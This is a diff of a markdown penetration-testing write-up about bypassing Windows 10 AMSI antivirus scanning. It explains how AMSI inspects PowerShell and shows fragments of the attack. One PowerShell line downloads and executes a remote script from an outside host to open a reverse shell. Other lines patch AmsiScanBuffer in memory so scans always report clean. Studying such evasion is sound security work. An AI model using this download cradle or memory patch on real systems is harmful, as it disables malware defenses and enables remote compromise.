@@ -4,21 +4,15 @@
 - [ **Proof of Concept - Bypassing 2023 Windows 10 Pro AMSI**](#section-2)
 - [ **Obfuscation Methodolgy Anlysis**](#section-3)
 - [ **Credits & Reference**](#section-4)
-## Outline 
 
 
-## AMSI 
+## Outline
+![](/assets/AV/diagram.png)   
 AMSI (Antimalware Scan Interface) is a Windows feature introduced in Windows 10 and Windows Server 2016. Its primary purpose is to provide an interface that allows antivirus and other security solutions to scan and inspect scripts and code in real-time at runtime
 
-By default windows defender interacts with the AMSI API to scan PowerShell scripts, VBA macros, JavaScript and scripts using the Windows Script Host technology during execution. This prevents arbitrary execution of code. Thus, when a script is about to be executed, it passes through AMSI, which scans the script's content for suspicious or malicious behavior. 
+By default windows defender interacts with the AMSI API to scan PowerShell scripts, VBA macros, JavaScript and scripts using the Windows Script Host technology during execution. When a user executes a script or initiates PowerShell, the AMSI.dll is injected into the process memory space. Prior to execution the following two API’s are used by the antivirus to scan the buffer and strings for signs of malware. This ultimately prevents arbitrary execution of code.
 
-## AMSI Logic
-When a user executes a script or initiates PowerShell, the AMSI.dll is injected into the process memory space. Prior to execution the following two API’s are used by the antivirus to scan the buffer and strings for signs of malware.
-
-AmsiScanBuffer()
-AmsiScanString()
-If a known signature is identified execution doesn’t initiate and a message appears that the script has been blocked by the antivirus software
-
+The goal of this write-up is to demonstrate bypassing the most up to date AMSI protection measure implemented in Windows 10 Pro (2023/07/28) 
 # AMSI Bypass Technique
 The following evasive techniques aim to avoid detection by antivirus and security software.  
 
@@ -43,7 +37,7 @@ IEX (New-Object Net.WebClient).DownloadString('http://192.168.20.128:8443/Invoke
 ```
 However, as seen above, AMSI sucessfully flags the activity as  `malicious` and proceeds to block the reverse shell connection. 
 ## Memory Patching
-In order to bypass AMSI, the tester utilzed the following payload. This patches the AmsiScanBuffer() function in order to return always `AMSI_RESULT_CLEAN` which indicates that no detection has been found. 
+In order to bypass AMSI, the tester utilzed the following payload. This patches the `AmsiScanBuffer()` function in order to return always `AMSI_RESULT_CLEAN` which indicates that no detection has been found.
 ```bash
 $thing = @"
 // thing 
@@ -83,7 +77,9 @@ $p = 0
 
 [System.Runtime.InteropServices.Marshal]::Copy($byteArrayFun, 0, $dest, 6)
 ```
-The patch is displayed in the following line:
+
+
+
 
 
 
